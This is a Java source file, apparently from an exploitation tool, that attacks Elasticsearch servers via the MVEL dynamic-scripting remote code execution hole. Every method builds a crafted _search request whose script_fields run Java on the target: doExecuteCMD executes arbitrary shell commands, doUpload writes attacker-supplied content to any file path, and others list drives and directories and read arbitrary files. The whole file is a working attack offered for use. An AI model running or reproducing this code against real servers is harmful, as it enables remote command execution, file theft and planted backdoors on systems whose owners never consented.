package org.vti.service.impl;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import org.vti.service.MyService;
import org.vti.util.RequestUtil;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

public class ESMvelServiceImp implements MyService{

	@Override
	public String doExecuteCMD(String host, String param) throws Exception {
		
		String cmdUrl= "/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}}," +
				"%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;\\nimport%20java.io.*;\\nString%20str%20=%20\\%22\\%22;" +
				"BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(\\%22" + URLEncoder.encode(param, "UTF-8") + "\\%22).getInputStream()));" +
						"StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null){sb.append(str%2b%5C%22%5Cr%5Cn%5C%22);}sb.toString();%22}}}";
		
		String result= new RequestUtil().doGetRequest(host+"/"+cmdUrl);
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		
		return fields.get("exp").getAsString();
	}

	@Override
	public boolean doUpload(String host, String path, String content)
			throws Exception {
		
		System.out.println(content);
		
		String cmdUrl="/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}}," +
				"%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;" +
				"\\nimport%20java.io.*;\\nFile%20f%20=%20new%20File(%5C%22" + URLEncoder.encode(path.replaceAll("\\\\", "/").replaceAll("/+", "/"),"UTF-8") + "%5C%22);" +
						"if(f.exists()){%5C%22exists%5C%22.toString();}" +
						"BufferedWriter%20bw%20=%20new%20BufferedWriter(new%20OutputStreamWriter(" +
						"new%20FileOutputStream(f),%5C%22UTF-8%5C%22));bw.write(%5C%22" + URLEncoder.encode(content,"UTF-8") + "%5C%22);" +
								"bw.flush();bw.close();if(f.exists()){%5C%22success%5C%22.toString();}%22}}}";
		String result= new RequestUtil().doGetRequest(host+"/"+cmdUrl);
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		
		System.out.println(fields);
		
		String echo= fields.get("exp").getAsString();
		
		if (echo.equals("success")) {
			return true;
		}else {
			return false;
		}
	}

	@Override
	public List<String> listRoots(String host) throws Exception{
		
		String cmdUrl= "/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}}," +
				"%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;\\nimport%20java.io.*;\\nString%20str%20=%20\\%22\\%22;" +
				"File%20[]%20files%20=File.listRoots();" +
				"StringBuilder%20sb%20=%20new%20StringBuilder();" +
				"for(File%20file:files){str=file.getPath();sb.append(str%2b%5C%22%5Cr%5Cn%5C%22);}sb.toString();%22}}}";
		String result= new RequestUtil().doGetRequest(host+"/"+cmdUrl);
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		
		String roots= fields.get("exp").getAsString();
		
		String array[]=roots.split("\n");
		
		List<String> distList=new ArrayList<String>();
		
		for (int i = 0; i < array.length; i++) {
			distList.add(array[i]);
		}
		
		return distList;
		
	}
	
	@Override
	public List<String> getFiles(String host, String path) throws Exception {
		
		String cmdUrl= "/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}}," +
				"%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;\\nimport%20java.io.*;\\nString%20str%20=%20\\%22\\%22;" +
				"File%20[]%20files%20=new%20File(%20\\%22"+path+"\\%22).listFiles();" +
				"StringBuilder%20sb%20=%20new%20StringBuilder();" +
				"for(File%20file:files){str=file.getName();sb.append(str%2b%5C%22%5Cr%5Cn%5C%22);}sb.toString();%22}}}";
		
		String result= new RequestUtil().doGetRequest(host+"/"+cmdUrl);
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		String text= fields.get("exp").getAsString();
		
		String arrays[]=text.split("\n");
		
		if (arrays.length>0) {
			
			List<String>fileList=new ArrayList<String>();
			
			for (int i = 0; i < arrays.length; i++) {
				fileList.add(arrays[i]);
			}
			
			return fileList;
		}else {
			return null;
		}
		
	}

	@Override
	public boolean isDirectory(String host, String path) throws Exception {
		
		String cmdUrl= "/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}}," +
				"%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;\\nimport%20java.io.*;" +
				"File%20file%20=new%20File(%20\\%22"+path+"\\%22);" +
				"file.isDirectory();%22}}}";
		
		String result= new RequestUtil().doGetRequest(host+"/"+cmdUrl);
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		boolean flag= fields.get("exp").getAsBoolean();
		
		return flag;
	}

	@Override
	public String getFileContent(String host, String path) throws Exception {
		
		String cmdUrl= "/_search?source={%22size%22:1,%22query%22:{%22filtered%22:{%22query%22:{%22match_all%22:{}}}}," +
				"%22script_fields%22:{%22exp%22:{%22script%22:%22import%20java.util.*;\\nimport%20java.io.*;\\nString%20str%20=%20\\%22\\%22;" +
				"InputStream%20inputStream%20=%20new%20FileInputStream(new%20File(%20\\%22"+path+"\\%22));" +
				"StringBuilder%20sb=%20new%20StringBuilder();int%20m=0;while((m=inputStream.read())!=-1)" +
				"{str=Integer.toHexString(m);sb.append(str);}sb.toString();%22}}}";
		String result= new RequestUtil().doGetRequest(host+"/"+cmdUrl);
		JsonObject object= new JsonParser().parse(result).getAsJsonObject();
		JsonObject hits= object.getAsJsonObject("hits").getAsJsonArray("hits").get(0).getAsJsonObject();
		JsonObject fields=hits.getAsJsonObject("fields");
		String content= fields.get("exp").getAsString();
		
		String viewText="";
	    String h = "0123456789abcdef";
	    for (int i = 0; i <content.length(); i += 2) {
	    	viewText+=(char)((h.indexOf(content.charAt(i)) << 4 | h.indexOf(content.charAt(i + 1))));
	    }
		
		return viewText;
	}
	
}
